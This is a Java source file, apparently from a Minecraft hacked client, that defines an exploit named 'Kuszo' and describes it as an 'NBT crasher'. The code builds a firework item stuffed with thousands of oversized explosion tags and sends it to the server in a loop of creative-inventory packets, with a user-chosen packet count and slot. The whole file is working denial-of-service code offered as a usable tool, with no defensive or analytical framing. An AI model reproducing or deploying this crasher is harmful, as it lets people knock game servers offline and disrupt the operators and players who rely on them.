package wtf.norma.nekito.exploit.impl.nbt;

import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.exploit.argument.Argument;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.network.NetHelper;

import java.util.Arrays;

@ExploitInfo(
        name = "Kuszo",
        type = ExploitType.NBT,
        description = "Simple NBT crasher"
)
public class KuszoExploit extends Exploit<ItemStack> {

    public KuszoExploit() {
        super(() -> {
            ItemStack itemStack = new ItemStack(Items.fireworks);

            NBTTagCompound compound = new NBTTagCompound();
            NBTTagCompound fireworks = new NBTTagCompound();
            NBTTagList explosions = new NBTTagList();

            int[] colors = new int[64];
            for (int i = 0; i < 3260; ++i) {
                Arrays.fill(colors, i + 1);

                NBTTagCompound explosion = new NBTTagCompound();
                explosion.setIntArray("Colors", colors);
                explosions.appendTag(explosion);
            }

            fireworks.setTag("Explosions", explosions);
            fireworks.setByte("Flight", (byte) 2);
            compound.setTag("Fireworks", fireworks);
            itemStack.setTagCompound(compound);
            return itemStack;
        }, new Argument("packets", 0, Integer.class), new Argument("slot", 1, Integer.class));
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        ChatHelper.printMessage(String.format("Sending &8[&7Method: &d%s&7, Packets: &d%s&8]", getName(), args[0]));
        for (int i = 0; i < packets; i++) {
            NetHelper.sendPacket(new C10PacketCreativeInventoryAction((Integer) args[1], exploitSource().get()));
        }
        ChatHelper.printMessage(String.format("Sent &8[&7Method: &d%s&7, Time: &d%sms&8]", getName(), System.currentTimeMillis() - start));
    }
}
